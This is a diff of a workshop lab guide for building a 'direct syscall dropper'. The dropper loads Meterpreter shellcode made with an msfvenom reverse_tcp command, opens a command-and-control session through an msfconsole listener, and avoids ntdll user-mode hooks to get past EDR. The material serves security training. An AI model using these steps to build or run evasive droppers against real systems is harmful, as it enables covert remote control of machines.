@@ -1,26 +1,23 @@
-## LAB Exercise 4: Low Level Dropper-Direct Syscalls
-In this exercise we will make the second modification to the reference dropper, create the direct syscall dropper and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). We call this the Low Level Direct Syscall Dropper, or syscall dropper for short. 
+## LAB Exercise 4: Direct Syscall Dropper
+Related to the Win32 dropper, in this exercise we will make the second modification, create the direct syscall dropper and implement the required syscalls or syscall stubs from each of the four native functions directly into the assembly (dropper). We will call this the direct syscall dropper.
 ![low_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235438881-e4af349a-0109-4d8e-80e2-730915c927f6.png)
 
-## Exercise 4 Tasks:
-### Creating the Direct Syscall Dropper 
-1. Download the syscall dropper POC from the Code section of this chapter.
-2. Most of the code is already implemented in the POC. However, you can complete the direct syscall dropper by performing the following tasks:
-     - Create a new syscalls.h header file and use the supplied code that follows in this playbook.
+## Exercise 4 Tasks: 
+1. Download the direct syscall dropper poc from the code section of this chapter.
+2. Most of the code is already implemented in the poc. However, you have to complete the direct syscall dropper by performing the following tasks:
+     - Create a new syscalls.h header file and use for syscalls.h the supplied code that follows in this playbook.
      - Import the syscalls.asm file as a resource and complete the assembly code by adding the missing assembler code for the remaining three native APIs following the scheme of the already implemented code for NtAllocateVirtualMemory.   
-3. Create a staged x64 meterpreter shellcode with msfvenom and copy it to the POC.  
-4. Compile the POC as a x64 release. 
-5. Create and run a staged x64 meterpreter listener using msfconsole.
-6. Run your compiled .exe and check that a stable command and control channel opens. 
-### Analysing the Direct Syscall Dropper
-7. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
-8. Use **x64dbg** to debug or analyse the dropper. 
+3. Create a staged x64 meterpreter shellcode with msfvenom, copy it to the poc and compile the poc. 
+4. Create and run a staged x64 meterpreter listener using msfconsole.
+5. Run your compiled .exe and check that a stable command and control channel opens. 
+6. Use the Visual Studio **dumpbin** tool to analyse the syscall dropper. Are any Win32 APIs being imported from kernel32.dll? Is the result what you expected?  
+7. Use **x64dbg** to debug or analyse the dropper. 
      - Check which Win32 APIs and native APIs are being imported. If they are being imported, from which module or memory location are they being imported? Is the result what you expected?
      - Check from which module or memory location the syscalls for the four APIs used are being executed. Is the result what you expected?
 
 
 ## Visual Studio
-You can download the POC from the code section of this chapter. The code works as follows, shellcode declaration is the same as before in both droppers.
+You can download the poc from the code section of this chapter. The code works as follows, shellcode declaration is the same as before in both droppers.
 <details>
     
 ```
@@ -31,7 +28,7 @@ You can download the POC from the code section of this chapter. The code works a
 </details>
 
 
-The main code of the direct syscall dropper looks like the following and is already implemented in the POC. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
+The main code of the direct syscall dropper looks like the following and is already implemented in the poc. Again, we use the same native APIs to allocate memory, write memory, create a new thread and wait for exit.
 <details>
 <summary>Code</summary>
     
@@ -72,7 +69,7 @@ int main() {
 
     
 ### Header File
-Unlike the mid-level dropper (NTAPIs), we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall POC folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include ``syscalls.h`` in the main C code. Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtWriteVirtualMemory] (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory).
+Unlike the native dropper, we **no longer ask ntdll.dll** for the function definition of the native APIs we use. But we still want to use the native functions, so we need to define or **directly implement** the structure for all four native functions in a header file. In this case, the header file should be called **syscalls.h**. The syscalls.h file does not currently exist in the syscall poc folder, your task is to add a new header file named syscalls.h and implement the required code. The code for the syscalls.h file can be found in the code section below. You will also need to include ``syscalls.h`` in the main C code. Additional information if you want to check the function definition manually should be available in the Microsoft documentation, e.g. for [NtWriteVirtualMemory] (https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory).
 
 <details>
 <summary>Code</summary>
@@ -158,7 +155,7 @@ extern "C" {         // This is to ensure that the names of the functions are no
     
 
 ### Assembly Instructions
-Furthermore, we do not want to ask ntdll.dll for the syscall stub or the contents of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we want to manually implement the necessary assembly code in the assembly itself. As mentioned above, instead of using a tool like SysWhispers3 to create the necessary assembly instructions, for the best learning experience, we will manually implement the assembly code in our syscall POC. To do this, you will find a file called ``syscalls.asm`` in the syscall dropper POC directory, which contains some of the required assembler code. The code needed to implement the syscall stub in syscalls.asm looks like this. It is your task to add the ``syscalls.asm`` file as a resource to the syscall dropper project and complete the assembler code or add the syscall stub for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. It is one of your tasks to complete the missing assembler code.
+Furthermore, we do not want to ask ntdll.dll for the syscall stub or the contents of the syscall stub (assembly instructions ``mov r10, rcx``, ``mov eax, SSN`` etc.) of the native functions we use, instead we want to manually implement the necessary assembly code in the assembly itself. As mentioned above, instead of using a tool like SysWhispers3 to create the necessary assembly instructions, for the best learning experience, we will manually implement the assembly code in our syscall poc. To do this, you will find a file called ``syscalls.asm`` in the direct syscall dropper poc directory, which contains some of the required assembler code. The code needed to implement the syscall stub in syscalls.asm looks like this. It is your task to add the ``syscalls.asm`` file as a resource to the direct syscall dropper project and complete the assembler code or add the syscall stub for the other three missing native APIs ``NtWriteVirtualMemory``, ``NtCreateThreadEx`` and ``NtWaitForSingleObject``. It is one of your tasks to complete the missing assembler code.
 
 <details>
 <summary>Code</summary>
@@ -177,7 +174,7 @@ END  ; End of the module
     
 </details>
 
-If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **syscall dropper POC**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
+If you are unable to complete the assembly code at this time, you can use the assembly code from the solution and paste it into the ``syscalls.asm`` file in the **direct syscall dropper poc**. **Note** that the syscalls IDs are for Windows 10 Enterprise 22H2 and may not work for your target. You may need to replace the syscalls IDs with the correct syscalls IDs for your target Windows version.
     
 <details>
     <summary>Solution</summary>
@@ -224,7 +221,7 @@ END  ; End of the module
     
     
 ### Microsoft Macro Assembler (MASM)
-We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the syscall POC, we need to do a few things. These steps are not done in the downloadable POC and must be done manually. First, we need to enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build Customisations.
+We have already implemented all the necessary assembler code in the syscalls.asm file. But in order for the code to be interpreted correctly within the syscall poc, we need to do a few things. These steps are not done in the downloadable poc and must be done manually. First, we need to enable the Microsoft Macro Assembler (.masm) option in Build Dependencies/Build Customisations.
 <details>
 <summary>Solution</summary> 
 <p align="center">
@@ -256,14 +253,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="800" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the Low-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+The shellcode can then be copied into the direct syscall dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="600" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 </details>    
 
 
 ## MSF-Listener
-Before we test the functionality of our Low-Level-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our direct syscall dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -285,7 +282,7 @@ run
 </details>
  
     
-Once the listener has been successfully started, you can run your compiled Low-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
+Once the listener has been successfully started, you can run your compiled direct syscall dropper. If all goes well, you should see an incoming command and control session. 
 <details>
     
 <p align="center">
@@ -295,7 +292,7 @@ Once the listener has been successfully started, you can run your compiled Low-L
         
 
     
-## Low-Level-Dropper analysis: dumpbin 
+## Direct Syscall Dropper Analysis: Dumpbin 
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>    
     
@@ -316,9 +313,9 @@ dumpbin /imports low_level.exe
 </details>   
     
     
-## Low-Level-Dropper analysis: x64dbg 
-The first step is to run your syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
-Then we open x64dbg and attach to the running process, note that if you open the syscall dropper directly in x64dbg, you need to run the assembly first.
+## Direct Syscall Dropper Analysis: x64dbg 
+The first step is to run your direct syscall dropper, check that the .exe is running and that a stable meterpreter C2 channel is open. 
+Then we open x64dbg and attach to the running process, note that if you open the direct syscall dropper directly in x64dbg, you need to run the assembly first.
 <details>
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/a8509e63-ddea-4dee-894f-b2266bb3e504">
@@ -329,10 +326,10 @@ Then we open x64dbg and attach to the running process, note that if you open the
 </details>
      
     
-First we want to check which APIs (Win32 or Native) are being imported and from which module or memory location. Remember that in the syscall dropper we no longer use Win32 APIs in the code and have implemented the structure for the native functions directly in the assembly. What results do you expect?
+First we want to check which APIs (Win32 or Native) are being imported and from which module or memory location. Remember that in the direct syscall dropper we no longer use Win32 APIs in the code and have implemented the structure for the native functions directly in the assembly. What results do you expect?
 <details>
     <summary>Solution</summary>
-     Checking the imported symbols in our syscall dropper, we should again see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are no longer imported by kernel32.dll, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid.     
+     Checking the imported symbols in our direct syscall dropper, we should again see that the Win32 APIs VirtualAlloc, WriteProcessMemory, CreateThread and WaitForSingleObject are no longer imported by kernel32.dll, or are no longer imported in general. So the result is the same as with dumpbin and seems to be valid.     
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/2fd0e78c-db42-4338-b943-5a198e62c7a1">
 </p>       
@@ -347,7 +344,7 @@ First we want to check which APIs (Win32 or Native) are being imported and from 
 We also want to check from which module or memory location the syscall stub of the native functions used is implemented, and also check from which module or memory location the syscall statement and return statement are executed.
 <details>
     <summary>Solution</summary>
-     In the context of the native function ``NtAllocateVirutalMemory``, we follow in the disassembler and should be able to see that the syscall stub is not retrieved from ntdll.dll, instead the stub is implemented directly into the .text section of the assembly. We can also see that the syscall statement and the return statement are executed from the memory location of the syscall dropper assembly.    
+     In the context of the native function ``NtAllocateVirutalMemory``, we follow in the disassembler and should be able to see that the syscall stub is not retrieved from ntdll.dll, instead the stub is implemented directly into the .text section of the assembly. We can also see that the syscall statement and the return statement are executed from the memory location of the direct syscall dropper assembly.    
 <p align="center">
 <img width="800" alt="image" src="https://github.com/VirtualAlllocEx/DEFCON-31-Syscalls-Workshop/assets/50073731/f78a51a0-fdc8-4c19-8d4b-924024c9dc5b">
 </p>       
@@ -358,7 +355,8 @@ We also want to check from which module or memory location the syscall stub of t
 
 
 ## Summary:
-- Made transition from medium to low level or from Native APIs to direct syscalls
+- Made transition from Native APIs to direct syscalls
 - Dropper imports no longer Windows APIs from kernel32.dll
 - Dropper imports no longer Native APIs from ntdll.dll
 - Syscalls or syscall stubs are "implemented" directly into .text section of .exe
+- User mode hooks in ntdll.dll and EDR can be bypassed 
